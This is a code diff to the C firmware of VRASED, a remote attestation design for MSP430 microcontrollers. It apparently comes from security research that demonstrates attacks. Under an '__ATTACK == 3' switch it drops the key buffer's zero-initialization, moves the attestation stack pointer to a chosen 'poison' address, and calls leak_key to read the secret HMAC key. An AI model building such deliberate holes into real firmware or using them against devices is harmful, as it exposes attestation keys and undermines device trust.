@@ -20,7 +20,16 @@ __attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() 
 
     //Save application stack pointer.
     //Allocate key buffer.
+    #if __ATTACK == 3
+    // NOTE: we explicitly remove the (redundant) zero-initialization here, as
+    // it may generate an early reset when writing out of the MAC region.
+    // However, this is only needed when the compiler does not already optimize
+    // away the redundant zero-intialization when noticing the explicit memcpy
+    // initialization below (e.g., as validated with clang-msp430).
+    uint8_t key[64];
+    #else
     uint8_t key[64] = {0};
+    #endif
     //Copy the key from KEY_ADDR to the key buffer.
     memcpy(key, (uint8_t*)KEY_ADDR, 64);
     hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) 64, (uint8_t*) MAC_ADDR, (uint32_t) 32);
@@ -52,6 +61,12 @@ __attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMA
 #define DMA_ATTACKER_PERSISTENT_FLAG    0x0072
 #define DMA_ATTACKER_MEASURE            0x0074
 #define DMA_ATTACKER_ACTIVE             0x0076
+
+#define KEY_SIZE                        64
+
+// MAC region: [0x0230, 0x250[
+// NOTE: leave 12 bytes for local variables of memcpy function
+#define STACK_POISON_ADDRESS            (MAC_ADDR + KEY_SIZE + 12)
 
 // stringify macro parameter a
 #define __s__(a)                        #a
@@ -102,6 +117,15 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
       return;
     #endif
 
+    #if __ATTACK == 3
+      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
+        leak_key((uint8_t*) (STACK_POISON_ADDRESS - 64), 0, 22);
+        return;
+      } else {
+        printf("First run\n");
+      }
+    #endif
+
     //Copy input challenge to MAC_ADDR:
     my_memcpy ( (uint8_t*)MAC_ADDR, challenge, 32);
 
@@ -123,7 +147,12 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     __asm__ volatile("mov    r1,    r5" "\n\t");
 
     // Set the stack pointer to the base of the exclusive stack:
-    __asm__ volatile("mov    #0x1002,     r1" "\n\t");
+    // NOTE: call will do a 2-byte push, hence desired address+2
+    #if __ATTACK == 3
+      __asm__ volatile("mov #" _s_(STACK_POISON_ADDRESS + 2) ",     r1" "\n\t");
+    #else
+      __asm__ volatile("mov    #0x1002,     r1" "\n\t");
+    #endif
 
     // Call SW-Att:
     Hacl_HMAC_SHA2_256_hmac_entry();
